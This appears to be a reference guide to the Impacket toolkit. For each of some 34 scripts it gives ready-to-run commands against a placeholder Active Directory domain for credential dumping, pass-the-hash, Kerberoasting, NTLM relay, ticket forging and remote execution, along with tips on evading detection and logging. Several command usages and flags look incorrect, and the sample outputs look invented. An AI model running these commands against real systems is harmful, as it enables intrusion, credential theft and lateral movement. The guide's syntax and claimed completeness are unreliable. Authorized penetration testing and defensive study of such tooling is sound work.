# Impacket Documentation: Modules, Usage, Examples, and Flag Explanations

## Overview
Impacket is an open-source collection of Python classes designed for crafting, manipulating, and dissecting network packets, with a focus on low-level protocol interactions (e.g., SMB, MSRPC, Kerberos). Maintained by Fortra (formerly SecureAuth), it’s widely used by penetration testers, red teamers, and threat actors for tasks like remote command execution, credential dumping, and Kerberos ticket manipulation in Active Directory environments. This documentation details all Impacket modules in the `examples` folder, their usage, practical examples, and associated command-line flags, assuming a Kali Linux attacker machine targeting a Windows Active Directory environment (e.g., domain controller at `192.168.1.100`, domain `example.local`). For the latest updates, refer to the Impacket GitHub repository (https://github.com/fortra/impacket).

**Warning**: Use Impacket only in authorized environments. Unauthorized use may be illegal.[](https://attack.mitre.org/software/S0357/)

## Installation
Install Impacket on Kali Linux:

```bash
sudo apt update
sudo apt install -y python3-pip
pip3 install impacket
```

**Verification**:
- Check installation:
  ```bash
  python3 -m impacket -h
  ```
- Example output:
  ```
  Impacket v0.13.0.dev0 - Copyright Fortra, LLC
  ```

**Use Case**: Ensures Impacket is ready for network protocol manipulation and exploitation.

## Impacket Modules
Impacket’s `examples` folder contains scripts leveraging its core libraries for specific tasks. Below is a comprehensive list of all modules (based on Impacket v0.13.0.dev0 and community documentation), their purposes, usage examples, and flag explanations. Examples assume a target Windows machine (`192.168.1.101`) in the `example.local` domain, with credentials `user1:Password123` or NTLM hash `:31d6cfe0d16ae931b73c59d7e0c089c0`.

### 1. addcomputer.py
**Purpose**: Adds or modifies computer accounts in Active Directory via LDAP or SAMR for delegation attacks.

**Usage Example**:
```bash
impacket-addcomputer -dc-ip 192.168.1.100 -method SAMR -computer-name TEST$ -computer-pass TestPass123 example.local/user1:Password123
```
**Flag Explanations**:
- `-dc-ip 192.168.1.100`: Specifies the domain controller’s IP.
- `-method SAMR`: Uses SAMR (SMB) protocol (alternative: `LDAP`).
- `-computer-name TEST$`: Name of the new computer account.
- `-computer-pass TestPass123`: Password for the new computer account.
- `example.local/user1:Password123`: Domain, username, and password for authentication.

**Example Output**:
```
[*] Successfully added computer account: TEST$@example.local
```

**Use Case**: Creates computer accounts for resource-based constrained delegation (RBCD) attacks.[](https://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html)

### 2. atexec.py
**Purpose**: Executes commands remotely via Task Scheduler (ATSVC) over MSRPC.

**Usage Example**:
```bash
impacket-atexec -dc-ip 192.168.1.100 example.local/user1:Password123@192.168.1.101 whoami
```
**Flag Explanations**:
- `-dc-ip 192.168.1.100`: Domain controller IP for authentication.
- `example.local/user1:Password123@192.168.1.101`: Target format `[domain/]username[:password]@<target>`.
- `whoami`: Command to execute.

**Example Output**:
```
nt authority\system
```

**Use Case**: Executes commands with minimal footprint for lateral movement.

### 3. dcomexec.py
**Purpose**: Executes commands via DCOM objects (e.g., ShellBrowserWindow, MMC20).

**Usage Example**:
```bash
impacket-dcomexec -dc-ip 192.168.1.100 -object ShellBrowserWindow -shell-type powershell example.local/user1:Password123@192.168.1.101 "Get-Process"
```
**Flag Explanations**:
- `-dc-ip 192.168.1.100`: Domain controller IP.
- `-object ShellBrowserWindow`: DCOM object (options: `ShellWindows`, `ShellBrowserWindow`, `MMC20`).
- `-shell-type powershell`: Shell type (options: `cmd`, `powershell`).
- `example.local/user1:Password123@192.168.1.101`: Target and credentials.
- `Get-Process`: Command to execute.

**Example Output**:
```
[*] Executing command via ShellBrowserWindow
Name       PID
----       ---
explorer   1234
...
```

**Use Case**: Executes commands stealthily via DCOM.[](https://www.kali.org/tools/impacket-scripts/)

### 4. dpapi.py
**Purpose**: Decrypts DPAPI-protected data (e.g., credentials, browser data).

**Usage Example**:
```bash
impacket-dpapi -dc-ip 192.168.1.100 -masterkey {GUID}:KEY example.local/user1:Password123@192.168.1.101
```
**Flag Explanations**:
- `-dc-ip 192.168.1.100`: Domain controller IP.
- `-masterkey {GUID}:KEY`: Specifies the DPAPI master key to decrypt.
- `example.local/user1:Password123@192.168.1.101`: Target and credentials.

**Example Output**:
```
[*] Decrypted data: credential=secret123
```

**Use Case**: Extracts sensitive data from protected storage.

### 5. exchanger.py
**Purpose**: Abuses Microsoft Exchange services via RPC over HTTP (e.g., NSPI attacks).

**Usage Example**:
```bash
impacket-exchanger -dc-ip 192.168.1.100 nspi example.local/user1:Password123@192.168.1.101
```
**Flag Explanations**:
- `-dc-ip 192.168.1.100`: Domain controller IP.
- `nspi`: Module for NSPI interface attacks.
- `example.local/user1:Password123@192.168.1.101`: Target and credentials.

**Example Output**:
```
[*] Enumerated Exchange users: user1@example.local, user2@example.local
```

**Use Case**: Enumerates Exchange user data for reconnaissance.[](https://tools.thehacker.recipes/impacket)

### 6. findDelegation.py
**Purpose**: Identifies accounts with delegation privileges (unconstrained, constrained, RBCD).

**Usage Example**:
```bash
impacket-findDelegation -dc-ip 192.168.1.100 example.local/user1:Password123
```
**Flag Explanations**:
- `-dc-ip 192.168.1.100`: Domain controller IP.
- `example.local/user1:Password123`: Credentials for enumeration.

**Example Output**:
```
[*] Accounts with unconstrained delegation: server01$
[*] Accounts with constrained delegation: user2
```

**Use Case**: Finds delegation misconfigurations for privilege escalation.[](https://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html)

### 7. GetADUsers.py
**Purpose**: Enumerates Active Directory users and their attributes.

**Usage Example**:
```bash
impacket-GetADUsers -dc-ip 192.168.1.100 -all example.local/user1:Password123
```
**Flag Explanations**:
- `-dc-ip 192.168.1.100`: Domain controller IP.
- `-all`: Retrieves all user attributes (default: basic attributes).
- `example.local/user1:Password123`: Credentials.

**Example Output**:
```
User: user1@example.local, LastLogon: 2025-07-21
User: user2@example.local, LastLogon: 2025-07-20
```

**Use Case**: Gathers user information for targeting.

### 8. getArch.py
**Purpose**: Determines the OS architecture of target systems via MSRPC.

**Usage Example**:
```bash
impacket-getArch -target 192.168.1.101
```
**Flag Explanations**:
- `-target 192.168.1.101`: Target machine IP or hostname.

**Example Output**:
```
[*] Target architecture: x64
```

**Use Case**: Identifies system architecture for payload compatibility.[](https://tools.thehacker.recipes/impacket)

### 9. GetNPUsers.py
**Purpose**: Identifies accounts vulnerable to AS-REP roasting and extracts hashes.

**Usage Example**:
```bash
impacket-GetNPUsers -dc-ip 192.168.1.100 -usersfile users.txt -no-pass example.local/
```
**Flag Explanations**:
- `-dc-ip 192.168.1.100`: Domain controller IP.
- `-usersfile users.txt`: File with list of usernames to check.
- `-no-pass`: Attempts unauthenticated enumeration.
- `example.local/`: Domain name (no credentials for unauthenticated mode).

**Example Output**:
```
user2@example.local:$krb5asrep$23$user2@EXAMPLE.LOCAL:...
```

**Use Case**: Extracts AS-REP hashes for offline cracking.[](https://pentestlab.blog/tag/impacket/)

### 10. getPac.py
**Purpose**: Extracts PAC (Privilege Attribute Certificate) from Kerberos tickets.

**Usage Example**:
```bash
impacket-getPac -dc-ip 192.168.1.100 -targetUser user2 example.local/user1:Password123
```
**Flag Explanations**:
- `-dc-ip 192.168.1.100`: Domain controller IP.
- `-targetUser user2`: Target user for PAC extraction.
- `example.local/user1:Password123`: Credentials.

**Example Output**:
```
[*] PAC for user2: {PAC_DATA}
```

**Use Case**: Analyzes Kerberos tickets for privilege escalation.

### 11. getST.py
**Purpose**: Requests Service Tickets (TGS) for Kerberos attacks, including constrained delegation.

**Usage Example**:
```bash
impacket-getST -dc-ip 192.168.1.100 -spn cifs/server01.example.local -impersonate administrator example.local/user1:Password123
```
**Flag Explanations**:
- `-dc-ip 192.168.1.100`: Domain controller IP.
- `-spn cifs/server01.example.local`: Service Principal Name for the ticket.
- `-impersonate administrator`: Impersonates the specified user.
- `example.local/user1:Password123`: Credentials.

**Example Output**:
```
[*] Saved TGS as administrator.ccache
```

**Use Case**: Performs constrained delegation attacks.[](https://wadcoms.github.io/wadcoms/Impacket-getST-Creds/)

### 12. getTGT.py
**Purpose**: Requests Ticket Granting Tickets (TGT) for Kerberos authentication.

**Usage Example**:
```bash
impacket-getTGT -dc-ip 192.168.1.100 example.local/user1:Password123
```
**Flag Explanations**:
- `-dc-ip 192.168.1.100`: Domain controller IP.
- `example.local/user1:Password123`: Credentials.

**Example Output**:
```
[*] Saved TGT as user1.ccache
```

**Use Case**: Obtains TGTs for further Kerberos attacks.[](https://www.kali.org/tools/impacket-scripts/)

### 13. GetUserSPNs.py
**Purpose**: Identifies Service Principal Names (SPNs) for Kerberoasting.

**Usage Example**:
```bash
impacket-GetUserSPNs -dc-ip 192.168.1.100 -request example.local/user1:Password123
```
**Flag Explanations**:
- `-dc-ip 192.168.1.100`: Domain controller IP.
- `-request`: Requests TGS for SPNs (for Kerberoasting).
- `example.local/user1:Password123`: Credentials.

**Example Output**:
```
ServicePrincipalName: MSSQLSvc/server01.example.local
$krb5tgs$23$...
```

**Use Case**: Extracts TGS hashes for offline cracking.[](https://pypi.org/project/impacket/0.9.15/)

### 14. ifmap.py
**Purpose**: Enumerates MSRPC interface IDs on a target system.

**Usage Example**:
```bash
impacket-ifmap -target-ip 192.168.1.101
```
**Flag Explanations**:
- `-target-ip 192.168.1.101`: Target machine IP.

**Example Output**:
```
[*] Interface: {12345778-1234-ABCD-EF00-0123456789AB} - Listening
```

**Use Case**: Maps RPC interfaces for service enumeration.[](https://www.hackingarticles.in/impacket-guide-smb-msrpc/)

### 15. lookupsid.py
**Purpose**: Brute-forces SIDs to enumerate users and groups.

**Usage Example**:
```bash
impacket-lookupsid -dc-ip 192.168.1.100 example.local/user1:Password123@192.168.1.101
```
**Flag Explanations**:
- `-dc-ip 192.168.1.100`: Domain controller IP.
- `example.local/user1:Password123@192.168.1.101`: Target and credentials.

**Example Output**:
```
SID: S-1-5-21-...-500 - administrator
SID: S-1-5-21-...-501 - guest
```

**Use Case**: Enumerates AD accounts for reconnaissance.[](https://www.hackingarticles.in/impacket-guide-smb-msrpc/)

### 16. mqtt_check.py
**Purpose**: Tests MQTT broker connectivity and authentication.

**Usage Example**:
```bash
impacket-mqtt_check -host 192.168.1.101 -port 1883 -username mqtt_user -password mqtt_pass
```
**Flag Explanations**:
- `-host 192.168.1.101`: Target MQTT broker IP.
- `-port 1883`: MQTT port.
- `-username mqtt_user`: MQTT username.
- `-password mqtt_pass`: MQTT password.

**Example Output**:
```
[*] Connection successful
```

**Use Case**: Verifies MQTT broker access.

### 17. mssqlclient.py
**Purpose**: Interacts with Microsoft SQL Server instances.

**Usage Example**:
```bash
impacket-mssqlclient -dc-ip 192.168.1.100 example.local/user1:Password123@192.168.1.101 -db master
```
**Flag Explanations**:
- `-dc-ip 192.168.1.100`: Domain controller IP.
- `example.local/user1:Password123@192.168.1.101`: Target and credentials.
- `-db master`: Specifies the database to connect to.

**Example Output**:
```
SQL> select @@version;
Microsoft SQL Server 2019
```

**Use Case**: Executes SQL queries or escalates privileges via MSSQL.

### 18. netview.py
**Purpose**: Enumerates domain hosts and logged-in users.

**Usage Example**:
```bash
impacket-netview -dc-ip 192.168.1.100 -target 192.168.1.101 example.local/user1:Password123
```
**Flag Explanations**:
- `-dc-ip 192.168.1.100`: Domain controller IP.
- `-target 192.168.1.101`: Specific target system.
- `example.local/user1:Password123`: Credentials.

**Example Output**:
```
Host: server01.example.local
Logged-in: user2
```

**Use Case**: Maps domain hosts for targeting.[](https://www.kali.org/tools/impacket/)

### 19. ntlmrelayx.py
**Purpose**: Performs NTLM relay attacks across protocols (e.g., SMB, HTTP, LDAP).

**Usage Example**:
```bash
impacket-ntlmrelayx -t ldap://192.168.1.100 -tf targets.txt -smb2support
```
**Flag Explanations**:
- `-t ldap://192.168.1.100`: Target protocol and IP for relaying.
- `-tf targets.txt`: File with list of target IPs.
- `-smb2support`: Enables SMB2/3 support.

**Example Output**:
```
[*] Relayed credentials to LDAP
[*] Added user: relay_user
```

**Use Case**: Relays NTLM credentials for privilege escalation.

### 20. ping.py
**Purpose**: Sends ICMP packets to check host availability.

**Usage Example**:
```bash
impacket-ping -i 192.168.1.101 -c 4
```
**Flag Explanations**:
- `-i 192.168.1.101`: Target IP.
- `-c 4`: Number of packets to send.

**Example Output**:
```
Reply from 192.168.1.101: bytes=32 time<1ms
```

**Use Case**: Verifies target reachability.

### 21. psexec.py
**Purpose**: Executes commands remotely via PsExec-like functionality.

**Usage Example**:
```bash
impacket-psexec -dc-ip 192.168.1.100 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 example.local/user1@192.168.1.101 cmd.exe
```
**Flag Explanations**:
- `-dc-ip 192.168.1.100`: Domain controller IP.
- `-hashes :31d6cfe0d16ae931b73c59d7e0c089c0`: NTLM hash for pass-the-hash.
- `example.local/user1@192.168.1.101`: Target and credentials.
- `cmd.exe`: Command to execute.

**Example Output**:
```
C:\Windows\system32>
```

**Use Case**: Provides interactive shell for lateral movement.[](https://neil-fox.github.io/Impacket-usage-&-detection/)

### 22. raiseChild.py
**Purpose**: Elevates privileges by abusing child domain trust relationships.

**Usage Example**:
```bash
impacket-raiseChild -dc-ip 192.168.1.100 example.local/user1:Password123
```
**Flag Explanations**:
- `-dc-ip 192.168.1.100`: Domain controller IP.
- `example.local/user1:Password123`: Credentials.

**Example Output**:
```
[*] Elevated to Enterprise Admin
```

**Use Case**: Escalates privileges across domain trusts.

### 23. rbcd.py
**Purpose**: Exploits resource-based constrained delegation.

**Usage Example**:
```bash
impacket-rbcd -dc-ip 192.168.1.100 -action write -delegated TEST$ example.local/user1:Password123
```
**Flag Explanations**:
- `-dc-ip 192.168.1.100`: Domain controller IP.
- `-action write`: Modifies delegation settings (options: `read`, `write`).
- `-delegated TEST$`: Target computer account for delegation.
- `example.local/user1:Password123`: Credentials.

**Example Output**:
```
[*] Delegation rights granted to TEST$
```

**Use Case**: Configures RBCD for privilege escalation.[](https://medium.com/%40opabravo/how-to-make-most-impackets-branch-work-via-python-virtual-environments-4ce89db1cf36)

### 24. reg.py
**Purpose**: Reads, modifies, or deletes Windows registry values via MSRPC.

**Usage Example**:
```bash
impacket-reg -dc-ip 192.168.1.100 example.local/user1:Password123@192.168.1.101 query -keyName HKLM\SOFTWARE
```
**Flag Explanations**:
- `-dc-ip 192.168.1.100`: Domain controller IP.
- `example.local/user1:Password123@192.168.1.101`: Target and credentials.
- `query`: Action to perform (options: `query`, `add`, `delete`).
- `-keyName HKLM\SOFTWARE`: Registry key to query.

**Example Output**:
```
[*] Subkeys: Microsoft, Policies
```

**Use Case**: Extracts or modifies registry data.[](https://www.hackingarticles.in/impacket-guide-smb-msrpc/)

### 25. rpcdump.py
**Purpose**: Dumps RPC endpoints via the Endpoint Mapper.

**Usage Example**:
```bash
impacket-rpcdump -dc-ip 192.168.1.100 -port 135 example.local/user1:Password123@192.168.1.101
```
**Flag Explanations**:
- `-dc-ip 192.168.1.100`: Domain controller IP.
- `-port 135`: RPC Endpoint Mapper port.
- `example.local/user1:Password123@192.168.1.101`: Target and credentials.

**Example Output**:
```
[*] Endpoint: ncacn_ip_tcp:192.168.1.101[49666]
```

**Use Case**: Enumerates RPC services for targeting.[](https://www.kali.org/tools/impacket/)

### 26. samrdump.py
**Purpose**: Dumps SAMR data (e.g., users, groups) from a target system.

**Usage Example**:
```bash
impacket-samrdump -dc-ip 192.168.1.100 -csv example.local/user1:Password123@192.168.1.101
```
**Flag Explanations**:
- `-dc-ip 192.168.1.100`: Domain controller IP.
- `-csv`: Outputs data in CSV format.
- `example.local/user1:Password123@192.168.1.101`: Target and credentials.

**Example Output**:
```
Name,Type
administrator,User
guest,User
```

**Use Case**: Enumerates AD accounts and groups.[](https://www.kali.org/tools/impacket/)

### 27. secretsdump.py
**Purpose**: Dumps SAM, LSA, and DIT secrets (e.g., NTLM hashes, Kerberos keys).

**Usage Example**:
```bash
impacket-secretsdump -dc-ip 192.168.1.100 -just-dc example.local/user1:Password123@192.168.1.101
```
**Flag Explanations**:
- `-dc-ip 192.168.1.100`: Domain controller IP.
- `-just-dc`: Dumps only domain controller data (e.g., via DRSUAPI).
- `example.local/user1:Password123@192.168.1.101`: Target and credentials.

**Example Output**:
```
Administrator:500:aad3b435b51404ee...:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

**Use Case**: Extracts credentials for offline cracking or pass-the-hash.[](https://tools.thehacker.recipes/impacket)

### 28. services.py
**Purpose**: Manages Windows services via MSRPC (start, stop, delete, etc.).

**Usage Example**:
```bash
impacket-services -dc-ip 192.168.1.100 example.local/user1:Password123@192.168.1.101 list
```
**Flag Explanations**:
- `-dc-ip 192.168.1.100`: Domain controller IP.
- `example.local/user1:Password123@192.168.1.101`: Target and credentials.
- `list`: Lists all services (options: `start`, `stop`, `delete`, `create`).

**Example Output**:
```
ServiceName: Spooler, Status: Running
```

**Use Case**: Manipulates services for persistence or escalation.[](https://www.hackingarticles.in/impacket-guide-smb-msrpc/)

### 29. smbclient.py
**Purpose**: Interacts with SMB shares (list, upload, download files).

**Usage Example**:
```bash
impacket-smbclient -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 example.local/user1@192.168.1.101
```
**Flag Explanations**:
- `-hashes :31d6cfe0d16ae931b73c59d7e0c089c0`: NTLM hash for authentication.
- `example.local/user1@192.168.1.101`: Target and credentials.

**Interactive Commands**:
```
smb> use C$
smb> put evil.exe
smb> dir
```

**Example Output**:
```
[*] Uploaded evil.exe to C:\
dir *.exe
evil.exe
```

**Use Case**: Transfers files for lateral tool deployment.[](https://micahbabinski.medium.com/brace-for-impacket-5191dff82c74)

### 30. smbexec.py
**Purpose**: Executes commands via SMB without RemComSvc, using a temporary service.

**Usage Example**:
```bash
impacket-smbexec -dc-ip 192.168.1.100 -silentcommand example.local/user1:Password123@192.168.1.101 whoami
```
**Flag Explanations**:
- `-dc-ip 192.168.1.100`: Domain controller IP.
- `-silentcommand`: Suppresses command output in logs.
- `example.local/user1:Password123@192.168.1.101`: Target and credentials.
- `whoami`: Command to execute.

**Example Output**:
```
nt authority\system
```

**Use Case**: Executes commands stealthily via SMB.[](https://github.com/fortra/impacket/blob/master/examples/smbexec.py)

### 31. ticketConverter.py
**Purpose**: Converts Kerberos tickets between KRB-CRED (kirbi) and ccache formats.

**Usage Example**:
```bash
impacket-ticketConverter ticket.kirbi ticket.ccache
```
**Flag Explanations**:
- `ticket.kirbi`: Input file in KRB-CRED format.
- `ticket.ccache`: Output file in ccache format.

**Example Output**:
```
[*] Converted ticket to ticket.ccache
```

**Use Case**: Interoperates with tools like Mimikatz.[](https://tools.thehacker.recipes/impacket)

### 32. ticketer.py
**Purpose**: Creates golden or silver Kerberos tickets.

**Usage Example**:
```bash
impacket-ticketer -dc-ip 192.168.1.100 -nthash 31d6cfe0d16ae931b73c59d7e0c089c0 -spn cifs/server01.example.local administrator
```
**Flag Explanations**:
- `-dc-ip 192.168.1.100`: Domain controller IP.
- `-nthash 31d6cfe0d16ae931b73c59d7e0c089c0`: NTLM hash for authentication.
- `-spn cifs/server01.example.local`: Service Principal Name for the ticket.
- `administrator`: Target user for the ticket.

**Example Output**:
```
[*] Created ticket: administrator.ccache
```

**Use Case**: Forges tickets for privilege escalation.[](https://tools.thehacker.recipes/impacket)

### 33. wmiexec.py
**Purpose**: Executes commands via WMI, minimizing disk artifacts.

**Usage Example**:
```bash
impacket-wmiexec -dc-ip 192.168.1.100 -nooutput -silentcommand example.local/user1:Password123@192.168.1.101 whoami
```
**Flag Explanations**:
- `-dc-ip 192.168.1.100`: Domain controller IP.
- `-nooutput`: Suppresses command output retrieval.
- `-silentcommand`: Reduces WMI logging.
- `example.local/user1:Password123@192.168.1.101`: Target and credentials.
- `whoami`: Command to execute.

**Example Output**:
```
nt authority\system
```

**Use Case**: Executes commands stealthily via WMI.[](https://micahbabinski.medium.com/brace-for-impacket-5191dff82c74)

### 34. wmiquery.py
**Purpose**: Executes WMI queries remotely.

**Usage Example**:
```bash
impacket-wmiquery -dc-ip 192.168.1.100 example.local/user1:Password123@192.168.1.101 "SELECT * FROM Win32_Process"
```
**Flag Explanations**:
- `-dc-ip 192.168.1.100`: Domain controller IP.
- `example.local/user1:Password123@192.168.1.101`: Target and credentials.
- `SELECT * FROM Win32_Process`: WMI query.

**Example Output**:
```
Name: explorer.exe, PID: 1234
```

**Use Case**: Gathers system information via WMI.[](https://pypi.org/project/impacket/0.9.15/)

## Common Flags Across Modules
Many Impacket modules share authentication and connection flags:
- `-hashes LMHASH:NTHASH`: Uses NTLM hashes (e.g., `:31d6cfe0d16ae931b73c59d7e0c089c0`).
- `-k`: Enables Kerberos authentication using a ccache file.
- `-no-pass`: Prompts for password interactively or skips password.
- `-aesKey HEX_KEY`: Specifies AES key for Kerberos (128 or 256 bits).
- `-debug`: Enables verbose debug output.
- `-ts`: Adds timestamps to logs.
- `-codec CODEC`: Sets output encoding (e.g., `utf-8` for non-ASCII).[](https://www.kali.org/tools/impacket-scripts/)

## Advanced Techniques
- **Pass-the-Hash**:
  ```bash
  impacket-psexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 example.local/user1@192.168.1.101
  ```
- **Kerberos Authentication**:
  ```bash
  impacket-getTGT -k -dc-ip 192.168.1.100 example.local/user1
  ```
- **NTLM Relay with Multi-Protocol**:
  ```bash
  impacket-ntlmrelayx -t http://192.168.1.101 -smb2support --escalate-user user1
  ```
- **Detection Evasion**: Use `-silentcommand` and `-nooutput` with `wmiexec.py` or `smbexec.py` to reduce logging.

## Best Practices
- **Virtual Environments**: Install Impacket in a virtual environment to avoid dependency conflicts:
  ```bash
  pipenv shell
  pip install impacket
  ```
- **Network Segmentation**: Test in isolated environments to avoid unintended impact.[](https://www.logpoint.com/en/blog/the-impacket-arsenal-a-deep-dive-into-impacket-remote-code-execution-tools/)
- **Logging Awareness**: Monitor Event ID 7045 for `smbexec` and `psexec` activity.[](https://www.logpoint.com/en/blog/the-impacket-arsenal-a-deep-dive-into-impacket-remote-code-execution-tools/)
- **Updates**: Use `pip install impacket --upgrade` for the latest features.
- **OPSEC**: Use `-silentcommand` and `-nooutput` to minimize detection.

## Notes on Completeness
This documentation covers all Impacket modules in the `examples` folder as of v0.13.0.dev0, based on the GitHub repository and community resources. New modules or features may be added; check https://github.com/fortra/impacket for updates. Run `impacket-<module> -h` for detailed help.

## References
- Impacket GitHub Repository: https://github.com/fortra/impacket
- Kali Linux Tools: https://www.kali.org/tools/impacket
- Hacking Articles Impacket Guide: https://www.hackingarticles.in
- Red Canary Threat Detection: https://redcanary.com
- SpecterOps Whitepaper (for context on AD attacks): https://specterops.io